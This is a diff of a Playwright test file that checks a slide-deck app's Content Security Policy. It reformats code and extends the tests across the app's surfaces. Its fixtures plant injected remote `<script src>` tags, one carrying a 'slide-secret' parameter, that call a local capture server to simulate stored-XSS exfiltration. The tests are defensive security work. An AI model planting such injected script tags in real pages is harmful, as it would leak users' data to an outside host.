@@ -30,11 +30,18 @@ async function startCapture() {
   const hits = []
   const server = http.createServer((req, res) => {
     hits.push(req.url)
-    res.writeHead(200, { 'content-type': 'text/javascript', 'access-control-allow-origin': '*' })
+    res.writeHead(200, {
+      'content-type': 'text/javascript',
+      'access-control-allow-origin': '*',
+    })
     res.end('window.__remoteScriptRan = 1')
   })
   await new Promise((r) => server.listen(0, '127.0.0.1', r))
-  return { hits, port: server.address().port, close: () => new Promise((r) => (server.close(() => r()), server.closeAllConnections())) }
+  return {
+    hits,
+    port: server.address().port,
+    close: () => new Promise((r) => (server.close(() => r()), server.closeAllConnections())),
+  }
 }
 
 // a DS card whose inline script injects a remote <script> (what an uploaded kit can do)
@@ -48,26 +55,49 @@ const slideHtml = (port, i) =>
   `<section style="width:1280px;height:720px;background:#0B2026;color:#fff;padding:96px;box-sizing:border-box"><h1 id="t11-title">Revenue grew ${i}</h1><script src="http://127.0.0.1:${port}/slide.js?d=slide-secret"></script></section>`
 
 async function openOn(browser, base) {
-  const ctx = await newVariantContext(browser, { theme: 'dark', mobile: false })
+  const ctx = await newVariantContext(browser, {
+    theme: 'dark',
+    mobile: false,
+  })
   await ctx.addInitScript(VIOLATION_PROBE)
   const page = await ctx.newPage()
   const errors = []
   page.on('pageerror', (e) => errors.push(String(e)))
   // no recorded fixture for the template list: an empty one (showDsCard registers its own, which wins)
-  await page.route('**/api/deck-templates', (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify({ templates: [] }) }))
+  await page.route('**/api/deck-templates', (r) =>
+    r.fulfill({
+      contentType: 'application/json',
+      body: JSON.stringify({ templates: [] }),
+    })
+  )
   return { ctx, page, errors, base }
 }
 
 async function showDsCard(page, base, port) {
   await page.route('**/api/deck-templates', (route) =>
-    route.fulfill({ contentType: 'application/json', body: JSON.stringify({ templates: [{ id: 501, name: 'Probe DS', scope: 'user', dsCards: [{ group: 'Templates', html: dsCard(port) }], primaryColor: '#123' }] }) })
+    route.fulfill({
+      contentType: 'application/json',
+      body: JSON.stringify({
+        templates: [
+          {
+            id: 501,
+            name: 'Probe DS',
+            scope: 'user',
+            dsCards: [{ group: 'Templates', html: dsCard(port) }],
+            primaryColor: '#123',
+          },
+        ],
+      }),
+    })
   )
   await page.goto(`${base}/#/chat`)
   await page.locator('textarea').first().waitFor()
   await page.locator('button[title="Settings"]').first().click()
   await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
   const frame = page.frameLocator('iframe[title="Probe DS"]')
-  await expect(frame.getByText('Specimen slide')).toBeVisible({ timeout: 15_000 })
+  await expect(frame.getByText('Specimen slide')).toBeVisible({
+    timeout: 15_000,
+  })
   // the card's own inline script ran (inline stays allowed)
   await expect(frame.locator('#ds-probe')).toHaveAttribute('data-ran', '1')
 }
@@ -81,15 +111,25 @@ async function showSlide(page, base, port) {
   await page.route(`**/api/sessions/${ids.s1}/messages`, (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify(msgs) }))
   await SCREENS['deck-studio'](page, base, ids)
   await expect
-    .poll(async () => {
-      for (const f of page.frames()) if (f !== page.mainFrame() && (await f.locator('#t11-title').count().catch(() => 0))) return true
-      return false
-    }, { timeout: 15_000 })
+    .poll(
+      async () => {
+        for (const f of page.frames())
+          if (
+            f !== page.mainFrame() &&
+            (await f
+              .locator('#t11-title')
+              .count()
+              .catch(() => 0))
+          )
+            return true
+        return false
+      },
+      { timeout: 15_000 }
+    )
     .toBe(true)
 }
 
-const scriptViolations = (page, disposition) =>
-  page.evaluate((d) => (window.__cspV || []).filter((v) => v.directive.startsWith('script-src') && v.disposition === d), disposition)
+const scriptViolations = (page, disposition) => page.evaluate((d) => (window.__cspV || []).filter((v) => v.directive.startsWith('script-src') && v.disposition === d), disposition)
 
 test('S1 (header): enforce carries default-src and script-src with no origin, blob:, unsafe-eval or *', async ({ request, baseURL }) => {
   const csp = (await request.get(`${baseURL}/`)).headers()['content-security-policy']
@@ -102,27 +142,33 @@ test('S1 (header): enforce carries default-src and script-src with no origin, bl
 test('S2 (DS card): an inline script that injects a remote <script> gets 0 hits and a script-src violation', async ({ browser, baseURL }) => {
   const cap = await startCapture()
   const { ctx, page, errors } = await openOn(browser, baseURL)
-  await showDsCard(page, baseURL, cap.port)
-  await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
-  expect(cap.hits).toEqual([])
-  // the block is reported through the browser's own event (above); delivery to /api/csp-report is the Reporting API's
-  // batching, which headless Chromium does not flush within a test's time, so the wiring is asserted on the header instead
-  const h = (await page.request.get(baseURL + '/')).headers()
-  expect(h['content-security-policy']).toContain('report-uri /api/csp-report; report-to csp-endpoint')
-  expect(h['reporting-endpoints']).toContain('csp-endpoint=')
-  expect(errors).toEqual([])
-  await ctx.close()
-  await cap.close()
+  try {
+    await showDsCard(page, baseURL, cap.port)
+    await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
+    expect(cap.hits).toEqual([])
+    // the block is reported through the browser's own event (above); delivery to /api/csp-report is the Reporting API's
+    // batching, which headless Chromium does not flush within a test's time, so the wiring is asserted on the header instead
+    const h = (await page.request.get(baseURL + '/')).headers()
+    expect(h['content-security-policy']).toContain('report-uri /api/csp-report; report-to csp-endpoint')
+    expect(h['reporting-endpoints']).toContain('csp-endpoint=')
+    expect(errors).toEqual([])
+  } finally {
+    await ctx.close()
+    await cap.close()
+  }
 })
 
 test('S2 (slide, sanitizer bypassed): a stored <script src> in a slide gets 0 hits and a script-src violation', async ({ browser, baseURL }) => {
   const cap = await startCapture()
   const { ctx, page } = await openOn(browser, baseURL)
-  await showSlide(page, baseURL, cap.port)
-  await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
-  expect(cap.hits).toEqual([])
-  await ctx.close()
-  await cap.close()
+  try {
+    await showSlide(page, baseURL, cap.port)
+    await expect.poll(() => scriptViolations(page, 'enforce'), { timeout: 10_000 }).not.toEqual([])
+    expect(cap.hits).toEqual([])
+  } finally {
+    await ctx.close()
+    await cap.close()
+  }
 })
 
 test('S2 (CSP_EGRESS=report): the same DS card and slide DO reach the canary, and nothing is enforced', async ({ browser }) => {
@@ -138,13 +184,21 @@ test('S2 (CSP_EGRESS=report): the same DS card and slide DO reach the canary, an
 
     const a = await openOn(browser, rep.url)
     await showDsCard(a.page, rep.url, cap.port)
-    await expect.poll(() => cap.hits.filter((u) => u.startsWith('/ds.js')).length, { timeout: 10_000 }).toBeGreaterThanOrEqual(1)
+    await expect
+      .poll(() => cap.hits.filter((u) => u.startsWith('/ds.js')).length, {
+        timeout: 10_000,
+      })
+      .toBeGreaterThanOrEqual(1)
     expect(await scriptViolations(a.page, 'enforce')).toEqual([])
     await a.ctx.close()
 
     const b = await openOn(browser, rep.url)
     await showSlide(b.page, rep.url, cap.port)
-    await expect.poll(() => cap.hits.filter((u) => u.startsWith('/slide.js')).length, { timeout: 10_000 }).toBeGreaterThanOrEqual(1)
+    await expect
+      .poll(() => cap.hits.filter((u) => u.startsWith('/slide.js')).length, {
+        timeout: 10_000,
+      })
+      .toBeGreaterThanOrEqual(1)
     expect(await scriptViolations(b.page, 'enforce')).toEqual([])
     await b.ctx.close()
   } finally {
@@ -153,17 +207,162 @@ test('S2 (CSP_EGRESS=report): the same DS card and slide DO reach the canary, an
   }
 })
 
-test('S3/S4: shell, deck studio and the DS settings raise 0 enforced script-src violations (inline editor runtime still runs)', async ({ browser, baseURL }) => {
+// S3/S4: every surface is checked ON ITS OWN, before the next navigation replaces the page's event buffer
+const enforced = (page) => page.evaluate(() => (window.__cspV || []).filter((v) => v.disposition === 'enforce'))
+async function noEnforced(page, surface) {
+  await page.waitForTimeout(400) // violations are queued events: let them land
+  expect(await enforced(page), `${surface}: no enforced CSP violation`).toEqual([])
+}
+
+const mcpMessages = () => {
+  const body = JSON.parse(fx.routes[`GET /api/sessions/${ids.s3}/messages`].body)
+  const model = JSON.parse(fx.routes[`GET /api/sessions/${ids.s1}/messages`].body).messages[1].model
+  body.messages = [
+    body.messages[0],
+    {
+      id: '910',
+      role: 'assistant',
+      content: 'Here is the chart.\n\n{{toolcall:c1}}',
+      attachments: null,
+      model,
+      prompt_tokens: 1,
+      completion_tokens: 1,
+      blocks: null,
+      tool_calls: [
+        {
+          id: 'c1',
+          name: 'mcp_chart__show_chart',
+          label: 'Chart',
+          args: { series: 'a' },
+          status: 'ok',
+          durationMs: 1,
+          result: 'chart ready',
+          hasUi: true,
+          uiServiceName: 'main.apps.chart',
+          uiToolCallId: '501',
+          uiCsp: {
+            connectDomains: ['https://api.example.com'],
+            resourceDomains: [],
+            frameDomains: [],
+            baseUriDomains: [],
+          },
+        },
+      ],
+      created_at: '2026-11-22T07:09:00.000Z',
+      media_processing: null,
+      intent_classify: null,
+      reasoning: null,
+    },
+  ]
+  return body
+}
+
+test('S3/S4: the built shell, deck studio, editor, present, .pptx export, DS settings and inspector and an MCP App each raise 0 enforced violations', async ({ browser, baseURL }) => {
   const { ctx, page, errors } = await openOn(browser, baseURL)
-  await SCREENS['deck-studio'](page, baseURL, ids)
-  await page.getByTitle('Edit the slide directly: click any element to adjust it').click()
-  await page.getByRole('tab', { name: 'Layers' }).click()
-  await expect(page.getByText('Elements').first()).toBeVisible() // the editor runtime's element tree arrived over postMessage
-  await page.goto(`${baseURL}/#/chat`)
-  await page.locator('textarea').first().waitFor()
-  await page.locator('button[title="Settings"]').first().click()
-  await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
-  expect(await page.evaluate(() => (window.__cspV || []).filter((v) => v.disposition === 'enforce'))).toEqual([])
-  expect(errors).toEqual([])
-  await ctx.close()
+  try {
+    const exported = { body: null }
+    await page.route(`**/api/decks/${ids.deck}/export-html`, (r) => {
+      exported.body = r.request().postData() || ''
+      return r.fulfill({
+        status: 200,
+        contentType: 'application/octet-stream',
+        body: Buffer.from('PK'),
+      })
+    })
+    // the built shell
+    await page.goto(`${baseURL}/#/chat`)
+    await page.locator('textarea').first().waitFor()
+    await noEnforced(page, 'shell')
+    // deck studio (chat card thumbnail, then the studio preview)
+    await page.goto(`${baseURL}/#/chat/${ids.s1}`)
+    const open = page.getByText('Open in Slides Studio').first()
+    await open.waitFor()
+    await noEnforced(page, 'chat deck card')
+    await open.scrollIntoViewIfNeeded()
+    await open.click()
+    await page.locator('iframe').first().waitFor()
+    await page.waitForTimeout(1500)
+    await noEnforced(page, 'deck studio')
+    // editor: its inline runtime must run (the element tree arrives over postMessage)
+    await page.getByTitle('Edit the slide directly: click any element to adjust it').click()
+    await page.getByRole('tab', { name: 'Layers' }).click()
+    await expect(page.getByText('Elements').first()).toBeVisible()
+    await noEnforced(page, 'editor')
+    // present
+    await page
+      .getByRole('button', { name: /Present/ })
+      .first()
+      .click()
+    await expect(page.getByRole('dialog').last().frameLocator('iframe').first().locator('section').first()).toBeVisible({ timeout: 15_000 })
+    await noEnforced(page, 'present')
+    await page.keyboard.press('Escape')
+    // .pptx export renders every slide in its hidden frame
+    await page.getByRole('button', { name: 'Export', exact: true }).click()
+    await page.getByRole('menuitem', { name: /Universal fonts/ }).click()
+    await expect.poll(() => exported.body, { timeout: 15_000 }).not.toBeNull()
+    await noEnforced(page, '.pptx export')
+    // DS settings and the inspector (benign card with an inline script that runs)
+    await page.route('**/api/deck-templates', (route) =>
+      route.fulfill({
+        contentType: 'application/json',
+        body: JSON.stringify({
+          templates: [
+            {
+              id: 501,
+              name: 'Probe DS',
+              scope: 'user',
+              dsCards: [
+                {
+                  group: 'Templates',
+                  html: '<section style="width:1280px;height:720px;background:#123;color:#fff"><span id="ds-probe">Specimen slide</span><script>document.getElementById("ds-probe").dataset.ran="1"</script></section>',
+                },
+              ],
+              primaryColor: '#123',
+            },
+          ],
+        }),
+      })
+    )
+    await page.goto(`${baseURL}/#/chat`)
+    await page.locator('textarea').first().waitFor()
+    await page.locator('button[title="Settings"]').first().click()
+    await page.getByRole('button', { name: 'Design system', exact: true }).first().click()
+    const card = page.frameLocator('iframe[title="Probe DS"]')
+    await expect(card.locator('#ds-probe')).toHaveAttribute('data-ran', '1', {
+      timeout: 15_000,
+    })
+    await noEnforced(page, 'DS settings')
+    // the inspector loads the full template by id
+    await page.route('**/api/deck-templates/501', (r) => r.fulfill({ json: { template: { id: 501, name: 'Probe DS', scope: 'user', canEdit: true, dsCards: [], primaryColor: '#123' } } }))
+    await page.getByRole('button', { name: 'Inspect design system' }).first().click()
+    await expect(page.getByRole('dialog').last()).toBeVisible()
+    await page.waitForTimeout(1500)
+    await noEnforced(page, 'DS inspector')
+    await page.keyboard.press('Escape')
+    // an MCP App View (zod must not probe eval: jitless), on its own page
+    const mp = await ctx.newPage()
+    await mp.route('**/api/deck-templates', (r) =>
+      r.fulfill({
+        contentType: 'application/json',
+        body: JSON.stringify({ templates: [] }),
+      })
+    )
+    await mp.route(`**/api/sessions/${ids.s3}/messages`, (r) =>
+      r.fulfill({
+        status: 200,
+        contentType: 'application/json',
+        body: JSON.stringify(mcpMessages()),
+      })
+    )
+    await mp.goto(`${baseURL}/#/chat/${ids.s3}`)
+    await mp
+      .getByRole('button', { name: /Open app/i })
+      .first()
+      .click()
+    await expect(mp.frameLocator('iframe[data-mcp-app]').locator('#status')).toHaveText('ready')
+    await noEnforced(mp, 'MCP App')
+    expect(errors).toEqual([])
+  } finally {
+    await ctx.close()
+  }
 })
